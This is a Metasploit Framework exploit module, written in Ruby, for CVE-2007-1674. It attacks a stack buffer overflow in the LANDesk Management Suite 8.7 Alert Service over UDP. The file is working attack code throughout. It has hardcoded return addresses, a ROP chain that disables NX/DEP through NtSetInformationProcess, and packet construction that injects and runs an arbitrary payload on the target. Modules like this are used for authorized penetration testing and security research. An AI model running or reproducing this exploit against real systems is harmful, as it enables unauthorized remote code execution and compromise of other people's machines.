##
# $Id: landesk_aolnsrvr.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Udp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'LANDesk Management Suite 8.7 Alert Service Buffer Overflow',
			'Description'    => %q{
				This module exploits a stack buffer overflow in LANDesk Management Suite 8.7. By sending
				an overly long string to the Alert Service, a buffer is overwritten and arbitrary
				code can be executed.
			},
			'Author'         => 'MC',
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					['CVE', '2007-1674'],
					['OSVDB', '34964'],
					['URL', 'http://www.tippingpoint.com/security/advisories/TSRT-07-04.html'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 336,
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# Aolnsrvr 4.0
					[ 'Alerting Proxy 2000/2003/XP', { 'Ret' => 0x00423554 } ],
					[ 'Alerting Proxy 2003 SP1-2 (NX support)', { 'IB' => 0x00400000, 'ProcessInfo' => 0xed } ],
					[ 'Alerting Proxy XP SP2 (NX support)', { 'IB' => 0x00400000, 'ProcessInfo' => 0xe4 } ],
				],
			'Privileged'     => true,
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Apr 13 2007'))

		register_options([Opt::RPORT(65535)], self.class)
	end

	def exploit
		connect_udp

		if (target.name =~ /NX/)
			txt = Rex::Text.rand_text_alphanumeric(1024)

			ib = target['IB']

			# to bypass NX we need to emulate the call to ZwSetInformationProcess
			# with generic value (to work on 2k3 SP1-SP2 - XP SP2)


			# first we set esi to 0xed by getting the value on the stack
			#
			# 0x00401b46:
			# pop esi   <- esi = edh
			# retn

			txt[ 280, 4 ] = [ib + 0x1b46].pack('V')
			txt[ 296, 4] = [0xed].pack('V')

			# now we set ecx to 0x7ffe0300, eax to 0xed
			# 0x00401b43:
			# pop ecx    <-  ecx = 0x7ffe0300 - 0xFF0
			# mov eax, esi   <- eax == edh
			# pop esi    <- 0x45b4ea (data section)
			# retn

			txt[ 300, 4] = [ib + 0x1b43].pack('V')
			txt[ 304, 4] = [0x7ffe0300 - 0xff0].pack('V')
			txt[ 308, 4] = [ib + 0x5b4ea].pack('V')

			# we set edx to 0x7FFe300 (ecx + 0xff0)
			# 0x004106b1:
			# lea edx, [ecx+0ff0h]
			# mov [esi+4], edx
			# mov [esi+8], edi
			# pop edi
			# mov [esi+0Ch], eax
			# pop esi
			# retn

			txt[ 312, 4] = [ib + 0x106b1].pack('V')


			# finally we call NtSetInformationProcess (-1, target['ProcessInfo'], ib+0x4ec84, 4)
			# 0x0044ec84 is a pointer to 0x2 to disable NX
			# 0x0042a28e:
			# call dword ptr [edx]
			# mov esi, eax
			# mov eax, esi
			# pop edi
			# pop esi
			# pop ebp
			# pop ebx
			# add esp, 134h
			# retn 1Ch

			txt[ 324, 4] = [ib + 0x2a28e].pack('V')  # call dword ptr[ecx]
			txt[ 332, 16] = [-1, 34, 0x0044ec84, 4].pack('VVVV')

			# we catch the second exception to go back to our shellcode, now that
			# NX is disabled

			txt[ 652, 4 ] = [ib + 0x23554].pack('V')   # (jmp esp in atl.dll)
			txt[ 684, payload.encoded.length ] = payload.encoded

		else
			# One-shot overwrite =(
			txt = rand_text_alphanumeric(280) + [target.ret].pack('V') + payload.encoded
		end

		print_status("Trying target #{target.name}...")

		udp_sock.put(txt)

		handler(udp_sock)
		disconnect_udp
	end

end
